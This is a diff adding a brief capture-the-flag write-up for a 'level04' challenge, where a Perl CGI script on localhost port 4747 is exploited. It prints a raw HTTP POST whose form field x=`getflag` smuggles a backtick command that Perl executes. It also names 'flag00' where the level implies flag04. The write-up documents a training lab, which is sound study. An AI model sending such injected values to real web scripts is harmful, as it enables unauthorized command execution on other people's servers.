@@ -1,0 +1,15 @@
+on level 04 we have access to a perl cgi script that is owned by the flag04 user
+similarly to level03, if we manage to use this cgi script to execute the getflag command, we should be able to get the flag00
+we also see in the perl script that it is set up for localhost on port 4747
+We can therefore use telnet to connect to localhost on port 4747: telnet localhost 4747
+and send a post request with the value of x as `getflag` (with backticks so that is is interpreted as a command by perl)
+
+POST /level04.pl HTTP/1.1
+Host: localhost
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 11
+
+x=`getflag`
+
+And we manage to directly recover the flag
